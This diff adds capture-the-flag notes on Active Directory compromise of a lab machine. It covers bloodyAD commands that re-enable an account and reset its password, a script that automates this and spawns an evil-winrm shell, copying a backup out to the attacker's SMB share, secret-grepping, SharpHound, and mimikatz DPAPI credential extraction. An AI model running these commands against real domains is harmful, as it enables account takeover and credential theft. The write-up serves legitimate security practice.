@@ -128,3 +128,129 @@ MATCH p=shortestPath((n {owned:true})-[:MemberOf|HasSession|AdminTo|AllExtendedR
 look to see chain from ant.edwards to domain admin
 
 ![[Pasted image 20250522011631.png]]
+
+
+install bloodyad
+
+```
+sudo apt install bloodAD
+```
+
+```bash
+/usr/bin/bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
+```
+
+check if adam silver is enabled
+
+```bash
+netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'HJKL2025!'
+```
+
+change password
+
+```bash
+bloodyAD --host '10.10.11.70' -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password adam.silver Pototo_123
+```
+
+```bash
+netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'Pototo_123'
+```
+
+```bash
+evil-winrm -i 10.10.11.70 -d puppy.htb -u adam.silver -p 'Pototo_123'
+```
+
+```powershell
+whoami /priv
+```
+
+since the account gets disabled every 5 minutes
+
+adam_unlocker.sh
+
+```bash
+#!/bin/bash
+
+# Step 1: Enable adam.silver
+echo "[*] Enabling adam.silver account..."
+/usr/bin/bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
+
+# Step 2: Check if adam.silver is enabled with original password
+echo "[*] Testing login with old password (HJKL2025!)..."
+netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'HJKL2025!'
+
+# Step 3: Change password to Pototo_123
+echo "[*] Changing password for adam.silver to 'Pototo_123'..."
+/usr/bin/bloodyAD --host 10.10.11.70 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password adam.silver Pototo_123
+
+# Step 4: Verify new credentials work
+echo "[*] Verifying new password works for adam.silver..."
+netexec ldap 10.10.11.70 -d puppy.htb -u 'adam.silver' -p 'Pototo_123'
+
+# Step 5: Spawn Evil-WinRM shell
+echo "[*] Launching Evil-WinRM as adam.silver..."
+evil-winrm -i 10.10.11.70 -u adam.silver -p 'Pototo_123'
+```
+
+
+Local
+```bash
+impacket-smbserver loot $(pwd) -smb2support
+```
+
+DC
+```
+copy site-backup-2024-12-30.zip \\10.10.14.3\loot
+```
+
+```
+unzip site-backup-2024-12-30.zip
+```
+
+
+```
+grep -r -i -E 'password|passwd|pwd|secret|token|api|key' .
+```
+
+found creds in backup
+
+```bash
+evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'
+```
+
+```
+upload /opt/BloodHound-Legacy-master/Collectors/SharpHound.exe
+```
+
+.\sharpHound.exe -c All
+
+show all users in domain
+```
+net user
+```
+
+Look for access of DPAPI
+```
+dir "$env:APPDATA\Microsoft\Credentials"
+dir "$env:LOCALAPPDATA\Microsoft\Credentials"
+dir "$env:APPDATA\Microsoft\Protect"
+```
+
+https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html
+
+#DPAPI [DPAPI](DPAPI.md)
+
+```
+upload mimikatz.exe
+```
+
+```
+.\mimikatz.exe "dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" "exit"
+```
+
+read dpapi in windows
+```
+.\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" "exit"
+```
+
+.\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" "exit"
